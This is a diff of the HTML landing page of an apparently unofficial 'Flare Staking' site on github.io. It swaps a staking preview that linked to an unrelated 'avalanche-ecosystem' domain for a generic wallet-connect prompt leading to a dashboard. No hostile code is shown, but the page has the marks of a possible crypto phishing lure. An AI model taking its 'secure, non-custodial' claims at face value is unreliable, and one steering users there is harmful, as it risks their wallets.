@@ -3,114 +3,401 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Flare Staking</title>
-  <meta name="description" content="Flare Staking lets you stake FLR and receive a liquid staking token from your own wallet.">
+  <title>Flare Staking - Decentralized DeFi Portal</title>
+  <meta name="description" content="Secure, non-custodial portal for Flare Staking DeFi operations directly from your own wallet.">
   <link rel="canonical" href="https://flare-staking.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F5F3">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Flare Staking">
-  <meta property="og:description" content="Flare Staking lets you stake FLR and receive a liquid staking token from your own wallet.">
-  <meta property="og:url" content="https://flare-staking.github.io/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Flare Staking">
-  <meta name="twitter:description" content="Flare Staking lets you stake FLR and receive a liquid staking token from your own wallet.">
+  <meta name="robots" content="index,follow">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://flare-staking.github.io/#website",
-        "url": "https://flare-staking.github.io/",
-        "name": "Flare Staking",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://flare-staking.github.io/#app",
-        "name": "Flare Staking",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://flare-staking.github.io/"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://flare-staking.github.io/#organization",
-        "name": "Flare Staking",
-        "url": "https://flare-staking.github.io/"
-      }
-    ]
+  <link rel="prefetch" href="dashboard/">
+  <link rel="prerender" href="dashboard/">
+  <style>
+
+
+:root{
+  --bg:#F7F5F3;
+  --surface:#FFFFFF;
+  --surface-soft:#FBFAF8;
+  --ink:#151316;
+  --muted:#686168;
+  --faint:#9A939A;
+  --line:rgba(21,19,22,.10);
+  --line-strong:rgba(21,19,22,.16);
+  --accent:#E62058;
+  --accent-soft:rgba(230,32,88,.10);
+  --shadow:0 30px 80px -42px rgba(21,19,22,.38);
+}
+
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;
+  min-height:100dvh;
+  overflow:hidden;
+  color:var(--ink);
+  font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  line-height:1.5;
+  background:
+    radial-gradient(720px 360px at 50% -120px, rgba(230,32,88,.13), transparent 70%),
+    linear-gradient(180deg, #FFFEFD 0%, var(--bg) 100%);
+  -webkit-font-smoothing:antialiased;
+  display:grid;
+  grid-template-rows:auto 1fr auto;
+}
+
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+p,h1{margin:0}
+
+.topbar{
+  min-height:70px;
+  display:flex;
+  align-items:center;
+  gap:18px;
+  padding:17px clamp(18px,4vw,44px) 12px;
+}
+
+.brand{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  min-width:0;
+  font-size:1.02rem;
+  font-weight:800;
+  letter-spacing:0;
+  white-space:nowrap;
+}
+
+.brand img{
+  width:30px;
+  height:30px;
+  border-radius:9px;
+  box-shadow:0 8px 18px -12px rgba(21,19,22,.45);
+}
+
+.nav{
+  display:flex;
+  align-items:center;
+  gap:24px;
+  margin-left:12px;
+}
+
+.nav a{
+  color:var(--muted);
+  font-size:.92rem;
+  font-weight:600;
+  transition:color .16s ease;
+}
+
+.nav a:hover{color:var(--ink)}
+.spacer{flex:1}
+
+.ghost{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  min-height:38px;
+  padding:0 18px;
+  border:1px solid var(--line-strong);
+  border-radius:999px;
+  background:rgba(255,255,255,.62);
+  color:var(--ink);
+  font-size:.91rem;
+  font-weight:800;
+  box-shadow:0 14px 34px -28px rgba(21,19,22,.50);
+  transition:transform .16s ease,border-color .16s ease,background .16s ease;
+}
+
+.ghost:hover{
+  transform:translateY(-1px);
+  border-color:rgba(230,32,88,.42);
+  background:#fff;
+}
+
+.stage{
+  min-height:0;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:28px;
+  padding:10px clamp(18px,4vw,44px);
+  text-align:center;
+}
+
+.hero{
+  display:grid;
+  justify-items:center;
+  gap:14px;
+}
+
+h1{
+  font-size:clamp(2.75rem,6vw,4.55rem);
+  line-height:1.02;
+  letter-spacing:0;
+  font-weight:850;
+}
+
+.sub{
+  max-width:660px;
+  color:var(--muted);
+  font-size:clamp(1rem,1.55vw,1.2rem);
+  line-height:1.55;
+}
+
+.sub strong{
+  color:var(--ink);
+  font-weight:800;
+  box-shadow:inset 0 -.44em 0 var(--accent-soft);
+}
+
+.card{
+  width:min(590px,100%);
+  padding:22px;
+  border:1px solid var(--line);
+  border-radius:24px;
+  background:linear-gradient(180deg,#fff 0%,var(--surface-soft) 100%);
+  box-shadow:var(--shadow);
+}
+
+.route{
+  display:grid;
+  grid-template-columns:minmax(0,1fr) 46px minmax(0,1fr);
+  align-items:center;
+  gap:13px;
+}
+
+.leg{
+  min-width:0;
+  min-height:96px;
+  padding:16px;
+  border:1px solid var(--line);
+  border-radius:16px;
+  background:#fff;
+  text-align:left;
+}
+
+.lbl{
+  display:block;
+  color:var(--faint);
+  font-size:.72rem;
+  font-weight:800;
+  letter-spacing:.08em;
+  text-transform:uppercase;
+}
+
+.chip{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-top:10px;
+  min-width:0;
+  color:var(--ink);
+  font-size:1.18rem;
+  font-weight:850;
+}
+
+.ic{
+  width:28px;
+  height:28px;
+  flex:none;
+  border-radius:50%;
+}
+
+.asset{
+  min-width:0;
+  overflow:hidden;
+  text-overflow:ellipsis;
+}
+
+.switch{
+  width:46px;
+  height:46px;
+  border:1px solid var(--line-strong);
+  border-radius:50%;
+  background:var(--surface);
+  color:var(--muted);
+  display:grid;
+  place-items:center;
+  cursor:pointer;
+  box-shadow:0 18px 30px -24px rgba(21,19,22,.50);
+  transition:transform .18s ease,color .16s ease,border-color .16s ease,background .16s ease;
+}
+
+.switch span{
+  font-size:1.12rem;
+  line-height:1;
+  transition:transform .18s ease;
+}
+
+.switch:hover{
+  color:var(--accent);
+  border-color:rgba(230,32,88,.38);
+  background:var(--accent-soft);
+}
+
+.switch.is-swapped span{transform:rotate(180deg)}
+
+.primary{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  width:100%;
+  min-height:56px;
+  margin-top:16px;
+  border-radius:16px;
+  background:var(--accent);
+  color:#fff;
+  font-size:1.06rem;
+  font-weight:850;
+  box-shadow:0 22px 40px -24px rgba(230,32,88,.76);
+  transition:transform .16s ease,background .16s ease,box-shadow .16s ease;
+}
+
+.primary:hover{
+  transform:translateY(-1px);
+  background:var(--accent);
+  box-shadow:0 24px 44px -24px rgba(230,32,88,.88);
+}
+
+.primary span{font-size:1.35rem;line-height:1}
+
+.foot{
+  padding:12px 24px 22px;
+  color:var(--faint);
+  text-align:center;
+  font-size:.85rem;
+}
+
+.foot b{
+  color:var(--muted);
+  font-weight:800;
+}
+
+@media(max-width:720px){
+  .topbar{
+    min-height:62px;
+    gap:12px;
+    padding:13px 16px 8px;
   }
-  </script>
+
+  .brand{
+    font-size:.96rem;
+    gap:9px;
+  }
+
+  .brand img{
+    width:28px;
+    height:28px;
+  }
+
+  .nav{display:none}
+
+  .ghost{
+    min-height:36px;
+    padding:0 14px;
+    font-size:.86rem;
+  }
+
+  .stage{
+    gap:18px;
+    padding:6px 16px 8px;
+    justify-content:center;
+  }
+
+  .hero{gap:11px}
+
+  h1{
+    font-size:clamp(2.24rem,13vw,3.1rem);
+    line-height:1.03;
+  }
+
+  .sub{
+    max-width:34ch;
+    font-size:.96rem;
+    line-height:1.45;
+  }
+
+  .card{
+    padding:15px;
+    border-radius:20px;
+  }
+
+  .route{
+    grid-template-columns:1fr;
+    gap:10px;
+  }
+
+  .leg{
+    min-height:78px;
+    padding:13px 14px;
+    border-radius:14px;
+  }
+
+  .chip{
+    margin-top:7px;
+    font-size:1.04rem;
+  }
+
+  .switch{
+    width:40px;
+    height:40px;
+    justify-self:center;
+  }
+
+  .switch span{transform:rotate(90deg)}
+  .switch.is-swapped span{transform:rotate(270deg)}
+
+  .primary{
+    min-height:50px;
+    margin-top:12px;
+    border-radius:14px;
+    font-size:1rem;
+  }
+
+  .foot{
+    padding:8px 18px 14px;
+    font-size:.8rem;
+  }
+}
+
+@media(max-width:390px){
+  .topbar{padding-left:14px;padding-right:14px}
+  .brand span{max-width:138px;overflow:hidden;text-overflow:ellipsis}
+  .ghost{padding:0 12px}
+  .stage{gap:15px}
+  .card{padding:14px}
+}
+
+
+  
+.footer {
+  text-align: center !important;
+}
+  </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="#" aria-label="Flare Staking">
+    <div class="brand">
       <img src="favicon.png" width="30" height="30" alt="">
       <span>Flare Staking</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://flarescan.com/" target="_blank" rel="nofollow noopener noreferrer">Flarescan</a>
-      <a href="https://flare.network/" target="_blank" rel="nofollow noopener noreferrer">Flare Network</a>
-      <a href="https://www.coingecko.com/en/coins/flare" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
-    </nav>
+    </div>
     <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+    <nav class="nav" aria-label="Main Navigation">
+      <a href="how-it-works/">How it works</a>
+      <a href="faq/">FAQ</a>
+      <a href="about/">About</a>
+      <a href="security/">Security</a>
+      <a href="supported-chains/">Supported Chains</a>
+    </nav>
   </header>
-
-  <main class="stage">
-    <section class="hero" aria-label="Flare Staking">
-      <h1>Flare Staking</h1>
-      <p class="sub"><strong>Flare Staking</strong> lets you stake FLR and receive a liquid staking token from your own wallet.</p>
-    </section>
-
-    <section class="card" aria-label="Staking preview">
-      <div class="route">
-        <div class="leg">
-          <span class="lbl">Stake</span>
-          <span class="chip">
-            <img class="ic" src="flr.png" width="28" height="28" alt="FLR">
-            <span class="asset">FLR</span>
-          </span>
-        </div>
-        <button class="switch" type="button" data-switch aria-label="Switch stake and receive assets">
-          <span aria-hidden="true">&rarr;</span>
-        </button>
-        <div class="leg">
-          <span class="lbl">Receive</span>
-          <span class="chip">
-            <img class="ic" src="flr.png" width="28" height="28" alt="sFLR">
-            <span class="asset">sFLR</span>
-          </span>
-        </div>
-      </div>
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
-    </section>
+  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
+    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">Flare Staking</h1>
+    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
+    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
   </main>
-
-  <footer class="foot">
-    <b>Flare Staking</b> &mdash; 2026
-  </footer>
-
-  <script>
-  (function(){
-    "use strict";
-    var button = document.querySelector("[data-switch]");
-    if (!button) return;
-    button.addEventListener("click", function(){
-      var chips = document.querySelectorAll(".leg .chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
-      button.classList.toggle("is-swapped");
-    });
-  })();
-  </script>
+  <footer class="footer">Flare Staking &mdash; 2026</footer>
 </body>
 </html>
